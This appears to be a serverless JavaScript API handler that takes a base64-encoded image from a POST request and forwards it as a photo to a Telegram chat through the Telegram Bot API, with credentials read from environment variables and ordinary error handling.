import FormData from 'form-data';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            return res.status(500).json({ error: 'Server missing API configuration.' });
        }

        const { image } = req.body;
        if (!image) {
            return res.status(400).json({ error: 'No image data received' });
        }

        const base64Buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), 'base64');

        const telegramForm = new FormData();
        telegramForm.append('chat_id', CHAT_ID);
        telegramForm.append('photo', base64Buffer, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg'
        });

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        
        // Using the native, globally-available fetch here instead of node-fetch
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            body: telegramForm,
            headers: telegramForm.getHeaders()
        });

        const telegramResult = await telegramResponse.json();

        if (telegramResult.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: telegramResult.description || 'Telegram rejected photo' });
        }

    } catch (error) {
        console.error("Backend Error:", error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}